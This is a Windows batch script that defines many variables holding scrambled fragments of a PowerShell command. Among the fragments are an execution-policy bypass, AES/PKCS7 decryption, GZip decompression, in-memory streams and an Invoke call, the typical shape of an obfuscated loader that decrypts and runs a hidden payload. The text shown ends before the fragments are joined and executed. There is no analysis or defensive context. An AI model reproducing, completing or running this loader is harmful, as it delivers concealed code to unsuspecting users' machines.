@echo off
set "ggnyFQeHGc=($Ho"
set "jjzprcnZjP=d;$c"
set "kTaVkJpdbD=Disp"
set "ntqzHbnMnh=('Tg"
set "MEeyevZQCm=$EYJ"
set "KsKSPHxFYG=Lx ="
set "IsVlXKPqzI=.GZi"
set "kcjLAoEqMb=pres"
set "TNJPcRhXNQ=$UTJ"
set "wxNJGHodKQ=ode]"
set "AukVNRvIII= = ["
set "JWqzQIAHfq=.Dis"
set "ZxLUTfCGdy=1] -"
set "bylFoaLrOb=rity"
set "AyDpkGBTJe=e, 0"
set "hfzkVBdGna=::('"
set "QseQRyPhhl=ct S"
set "pyUBskeZbp=ptog"
set "bQLSGMyHex=y.Ci"
set "zRxZwruVyb=6esa"
set "jgjwgNvZam=);$c"
set "NktEImXzjx=pStr"
set "znRenMbJYP=zo, "
set "cIQiIjiRdb=tsWi"
set "wlfjhmPJGy=UTJz"
set "FQjYITZjJT=n ''"
set "nAxODFaSaY=Conv"
set "xNoRhXLJEr=] -j"
set "KysgBBXDnV='[-1"
set "fgqfdOfaWN=.Mem"
set "hYMrzqDetc=onve"
set "xYDAIWpHpx=ing("
set "auDLOPAzCg=ByzO"
set "HDilJAwdGe=and "
set "VYiztpBKuR=16] "
set "TLWFpDuKcd=join"
set "FWuXRYqBld=e = "
set "RrSvLWlUXU=$yHL"
set "QBOuVHJXdF=3); "
set "yJRDVPpWwj=$EYJ"
set "NWZtcmByOC=acYW"
set "ZIMRyUTskh=em.I"
set "AQTzEHNvbd=RmAx"
set "HyKlZSDxAe=eam("
set "hEzaiDiEJS=-nop"
set "CtKKmuuwcc=[Sys"
set "qxKdapTeZG=e]::"
set "ofipgdtJKQ=ose("
set "cNfYteKyWz=, (,"
set "ZJyGbeYYRx=nage"
set "XFWynHyMDM=[-1."
set "kwaXuklQKY= '')"
set "davGSqNCVk=gsYZ"
set "UWaVyfYDQm=ss -"
set "VBHozCRGRo=.Cop"
set "hSXwWxXPQC=e = "
set "oDmfFsXQma=.Sec"
set "yQjpvWMVrA=Secu"
set "nndOqEsqqA=pose"
set "DbzcElAKdj=('da"
set "SBqfPijjmb=tion"
set "xiMxlzKALe=y.Cr"
set "wsjNGNqBav=grap"
set "YTtENDaYzs=gMod"
set "tQJPmNcGOD=PKCS"
set "nSeCOahMvL=.Com"
set "jZQUckrerq='0Pg"
set "OIBMRSecfm=em.C"
set "ozGXTfrEGV=);$E"
set "IpRGexfUGR=jrO "
set "saBEZqthYG===')"
set "WlrJcuLraE=::De"
set "zEuuPDZedb=ke($"
set "KtNcHSdUka=ByzO"
set "mGNwTrlUfY=Obje"
set "QOWpURhZAd=We);"
set "SfqweTctCP=CcqL"
set "fytwHDXzgW=embl"
set "sogZlFayPs=m.IO"
set "ibYYvpctHk=rity"
set "IbycWMKHlU=y]::"
set "FziyAqNPlY= [Sy"
set "mOUJJrawdr=o = "
set "jxLIJixwoo=Comp"
set "vQccjYnfBG=HLWe"
set "bqslIAAlDy= [Sy"
set "qwpJRknRHw=x) {"
set "XAuYxmPlBA=oryS"
set "xoYrFaTXfE=trea"
set "FzbcvrBfsa=7;$c"
set "BAdxoIbAtx=BEOD"
set "QJxfrGRvFp=ddin"
set "HrhPpnVoEI=..-1"
set "HCbQYcCjPs=O.Pa"
set "skfsQmARKA=Stre"
set "EeNvmFnQAN=Ls ="
set "fhUylrvPTJ=DWs "
set "zXDOzdILyg=m(, "
set "IwTHGkcWtj=.Cry"
set "KNahTtYufc=ByzO"
set "KxyUPjznBT=.Len"
set "JuTiOwxDUF=D = "
set "LxUEvacugy=BC;$"
set "SIZPUArnfH=saBm"
set "XdZBfefrLm=; };"
set "GHlUSdYrRw=-4] "
set "JrxfPrrimW=$Ccq"
set "gvYTwXCNem=L4Yi"
set "VJlvlfXJUQ=-Obj"
set "rtnHKLaoPV=Invo"
set "eOHXWWwitn=PHXz"
set "lJcqsKMuUP=-1.."
set "ekEEinnKfU=;$UT"
set "QWnMdamemj=ptor"
set "jZQCUtTXVO=yste"
set "rrANrpSqvb=.IO."
set "gLvhOLaoTI= New"
set "VozkSndYrK=oArr"
set "osdLbJVAfj=-ep "
set "oKLKQtpVsQ=null"
set "eJkFStahKO=6] -"
set "VmIiuLbAcp=ect "
set "pcFVjVjXnJ=le  "
set "ogyHSESDdF=Jzo."
set "TVOITtHnRg=Star"
set "zRjqhyNcVG=]::C"
set "cmwXOMezNC=-joi"
set "YIqpeLkRdd=;$nY"
set "YulhauCBsN=PxEW"
set "jCkDsfqjZd=ptog"
set "LjedgXkRrf=Ls);"
set "GUMGUBoWbp=bstr"
set "gFdFXKtRjl=form"
set "HDVKSTdnMc=O.Me"
set "MBrWbsLkNc=raph"
set "ObXIgqBmDz=cByz"
set "NAfHQfWdHu=gnir"
set "cLINbpUHBa='gni"
set "SAhEyqpmJP=('%*'"
set "LnPYfwHEEZ=yTo("
set "rLvLKHZtSF=.Con"
set "DqAwlzsQxa=Ws.T"
set "VHjlrmyxtv=PTtG"
set "grPuPZAECQ=Comp"
set "hkwLAXJefM=zHhH"
set "TOHNIPunzC=daeR"
set "NJXluWaNdu=DWs."
set "GCjYTkfdtI=.Cre"
set "VudKVAeeBk=Wvh "
set "pNvmqiLNvw=comp"
set "pMkqPiZGZZ=ment"
set "jnMtlBYGMk=vert"
set "ccthOCRhwS=ay()"
set "sGBKvTCGBR=dj0C"
set "JAlEdElyyb=mory"
set "ySCFMdZckp=;$yY"
set "gzbATzwhNU=ZBEO"
set "BrhHVKKaVM=zuZI"
set "dNeJPlfcxl=.Cry"
set "zSfRIqJcWS=);$Z"
set "DCWnnPuYoN=]::("
set "oaNbcNlMdq=m.Re"
set "vHiBJuiWLj=bjec"
set "WAyvZiveGs=[Sys"
set "BjUoNmLpYW=h.Su"
